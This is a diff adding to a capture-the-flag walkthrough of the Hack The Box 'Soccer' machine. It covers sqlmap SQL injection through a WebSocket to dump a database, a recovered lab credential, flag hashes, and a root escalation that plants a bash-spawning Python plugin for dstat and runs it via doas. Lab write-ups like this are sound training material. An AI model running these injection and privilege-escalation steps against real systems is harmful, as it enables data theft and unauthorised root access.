@@ -106,3 +106,127 @@ echo '10.129.208.236 soc-player.soccer.htb' |sudo tee -a /etc/hosts
 http://soc-player.soccer.htb/
 
 ![image](https://github.com/r1skkam/HackTheBox-Walkthroughs/assets/58542375/ed5df05c-fc0a-4e36-b5c8-41994eebedd7)
+
+![image](https://github.com/r1skkam/HackTheBox-Walkthroughs/assets/58542375/69a6d501-9e50-4dbf-8796-651e67dd55e2)
+
+```
+<script>
+        var ws = new WebSocket("ws://soc-player.soccer.htb:9091");
+        window.onload = function () {
+        
+        var btn = document.getElementById('btn');
+        var input = document.getElementById('id');
+        
+        ws.onopen = function (e) {
+            console.log('connected to the server')
+        }
+        input.addEventListener('keypress', (e) => {
+            keyOne(e)
+        });
+        
+        function keyOne(e) {
+            e.stopPropagation();
+            if (e.keyCode === 13) {
+                e.preventDefault();
+                sendText();
+            }
+        }
+        
+        function sendText() {
+            var msg = input.value;
+            if (msg.length > 0) {
+                ws.send(JSON.stringify({
+                    "id": msg
+                }))
+            }
+            else append("????????")
+        }
+        }
+        
+        ws.onmessage = function (e) {
+        append(e.data)
+        }
+        
+        function append(msg) {
+        let p = document.querySelector("p");
+        // let randomColor = '#' + Math.floor(Math.random() * 16777215).toString(16);
+        // p.style.color = randomColor;
+        p.textContent = msg
+        }
+    </script>
+```
+
+![image](https://github.com/r1skkam/HackTheBox-Walkthroughs/assets/58542375/d68b82e0-979b-484b-99ed-cbd2d678a71c)
+
+![image](https://github.com/r1skkam/HackTheBox-Walkthroughs/assets/58542375/3c6c7d55-5507-48b6-9d87-2dc86a701745)
+
+```
+sqlmap -u "ws://soc-player.soccer.htb:9091" --data '{"id": "*"}' --dbs --threads 10 --level 5 --risk 3 --batch
+```
+
+```
+sqlmap -u "ws://soc-player.soccer.htb:9091" --data '{"id": "*"}' --threads 10 -D soccer_db --dump --batch
+```
+
+![image](https://github.com/r1skkam/HackTheBox-Walkthroughs/assets/58542375/a404bba5-6b7a-4291-9bf8-055645a35b0a)
+
+*player:PlayerOftheMatch2022*
+
+![image](https://github.com/r1skkam/HackTheBox-Walkthroughs/assets/58542375/43c89e0b-a928-4feb-bd78-addc9feac537)
+
+```
+f72899c03e0af8fb3262c4bdb3e99832
+```
+
+**SetUID bit**
+
+```
+find / -perm -4000 2>/dev/null
+```
+
+![image](https://github.com/r1skkam/HackTheBox-Walkthroughs/assets/58542375/69e4f477-9a4c-43d9-90fa-faa75251cd34)
+
+/usr/local/bin/doas
+
+![image](https://github.com/r1skkam/HackTheBox-Walkthroughs/assets/58542375/b56baa50-2099-44f1-94da-2c860d6eb635)
+
+![image](https://github.com/r1skkam/HackTheBox-Walkthroughs/assets/58542375/27ba1f52-a3ab-47cc-b3e7-c95aed0effc6)
+
+```
+find / -name dstat 2>/dev/null
+```
+
+/usr/local/share/dstat
+
+![image](https://github.com/r1skkam/HackTheBox-Walkthroughs/assets/58542375/ffe1ec0d-6bd4-4dc3-b0a2-95d82b4e1ef6)
+
+```
+man dstat
+```
+
+![image](https://github.com/r1skkam/HackTheBox-Walkthroughs/assets/58542375/09eece78-70c7-462e-b7ad-26b55135c82d)
+
+![image](https://github.com/r1skkam/HackTheBox-Walkthroughs/assets/58542375/d055e24e-d577-47d9-8b25-dab304656f7e)
+
+
+https://gtfobins.github.io/gtfobins/dstat/
+
+```
+echo 'import os; os.system("/bin/bash")' > /usr/local/share/dstat/dstat_pwn.py
+```
+
+![image](https://github.com/r1skkam/HackTheBox-Walkthroughs/assets/58542375/b484872d-b4a3-4bf2-b2ef-c4edbabfe0a3)
+
+```
+doas /usr/bin/dstat --pwn
+```
+
+![image](https://github.com/r1skkam/HackTheBox-Walkthroughs/assets/58542375/f18371c6-8066-4d34-8d12-d493dca0f8e9)
+
+```
+8e5ff553e7daa34162a79823d05ce903
+```
+
+![image](https://github.com/r1skkam/HackTheBox-Walkthroughs/assets/58542375/bd2613a7-56bb-4dd0-84f0-62e9cbd894a9)
+
+![image](https://github.com/r1skkam/HackTheBox-Walkthroughs/assets/58542375/0aeefdec-8617-4f54-a6f9-428af55bb1f1)
